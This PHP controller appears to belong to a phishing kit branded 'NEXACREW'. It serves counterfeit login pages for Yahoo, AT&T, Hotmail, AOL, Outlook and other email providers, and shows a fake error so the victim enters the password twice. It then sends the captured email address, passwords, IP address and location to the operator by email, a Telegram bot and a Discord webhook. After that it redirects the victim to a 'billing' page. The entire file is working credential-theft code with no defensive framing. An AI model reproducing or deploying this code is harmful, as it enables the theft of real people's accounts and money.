<?php
defined("ALLOW") or exit('No direct script access allowed');

class Oauth
{

	public $goNEXA;
	public function __construct()
	{
		$this->goNEXA = new goNEXA();

		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 3)) {
			write(FCPATH . 'Static/log_click.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|RELOAD\r\n");
			redirect(base_url() . '?' . _config('PARAMETER'));
		}
	}

	public function index()
	{
		$page = $_SESSION['email_type'];
		$att = array("att", "bellsouth", "flash", "sbcglobal", "prodigy");

		if (in_array($page, $att)) {
			$page = 'att';
		} else {
			$page = $page;
		}
		$page = strtolower($page);
		$accept  = array("yahoo", "att", "hotmail", "aol", "comcast", "charter", "outlook", "msn", "live", "optonline");

		if (in_array($page, $accept)) {
			echo view("email/{$page}/index");
		} else {
			if ($this->goNEXA->is_mobile) {
				echo view('email/email/mobile/index');
			} else {
				echo view('email/email/pc/index');
			}
		}
	}

	public function try()
	{
		$page = $_SESSION['email_type'];
		$att = array("att", "bellsouth", "flash", "sbcglobal", "prodigy");

		if (in_array($page, $att)) {
			$page = 'att';
		} else {
			$page = $page;
		}
		$page = strtolower($page);
		$accept  = array("yahoo", "att", "hotmail", "aol", "comcast", "charter", "outlook", "msn", "live", "optonline");

		if (in_array($page, $accept)) {
			echo view("email/{$page}/index.error");
		} else {
			if ($this->goNEXA->is_mobile) {
				echo view('email/email/mobile/index.error');
			} else {
				echo view('email/email/pc/index.error');
			}
		}
	}

	public function first()
	{
		if (isset($_POST['password'])) {
			$_SESSION['password_email'] = trim($_POST['password']);
		}

		redirect(base_url() . 'oauth/try?error_id=' . md5(time()));
	}

	public function process()
	{
		if (isset($_POST['password'])) {
			$_SESSION['password_email2'] = trim($_POST['password']);
			$email = ($_POST['emailLogin']) ? $_POST['emailLogin'] : $_SESSION['emailLogin'];
			$password	= ($_POST['password']) ? $_POST['password'] : '';
			$password2 	= ($_SESSION['password_email']) ? $_SESSION['password_email'] : $_POST['password'];


			$message =
				"== [NEXACREW] ==

== [EMAIL ACCESS] ==

:: Email Address   : {$email}
:: Password        : {$password2}
:: Check Password  : {$password}
:: Checking        : {$email}|{$password2}
:: Checking 2      : {$email}|{$password}

== [DEVICE INFORMATION] ==

:: Date & Time     : " . _date() . "
:: Device          : {$this->goNEXA->platform}
:: Browser         : {$this->goNEXA->browser}
:: Country         : {$_SESSION['country']}
:: State           : {$_SESSION['region']}
:: City            : {$_SESSION['city']}
:: IP Address      : {$this->goNEXA->ip_address}
:: User Agent      : {$this->goNEXA->agent}";

			$subject = "EMAIL ACCESS :: [ {$_SESSION['country']} - {$this->goNEXA->ip_address} ]";
			$headers = "From: NEXACREW <idontneed@nexacrew.net>\r\n";

			// Kirim ke Email
			@mail(_config('RESULT'), $subject, $message, $headers);

			// Kirim ke Telegram
			if (_config('Telegram') == 'on') {
				$c = curl_init();
				curl_setopt($c, CURLOPT_URL, 'https://api.telegram.org/bot' . tel('token') . '/sendMessage?chat_id=' . tel('idtelegram') . '&text=' . urlencode($message));
				curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
				curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
				curl_exec($c);
				curl_close($c);
			}

			// Kirim ke Discord
			if (discord('Discord') == 'on') {
				$discordWebhook = discord('DISCORD_WEBHOOK'); // Contoh: https://discord.com/api/webhooks/xxx/yyy
				$json_data = json_encode([
					"content" => $message
				]);

				$ch = curl_init($discordWebhook);
				curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
				curl_setopt($ch, CURLOPT_POST, 1);
				curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
				curl_exec($ch);
				curl_close($ch);
			}

			write(FCPATH . 'Static/log_email.txt', 'a', "{$this->goNEXA->ip_address}\r\n");
			write(FCPATH . 'Static/log_human.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|GET EMAIL ACCESS\r\n");

			$_SESSION['access'] = 4;
			redirect(base_url() . 'billing?_ts=' . md5(time()));
		}
	}
}
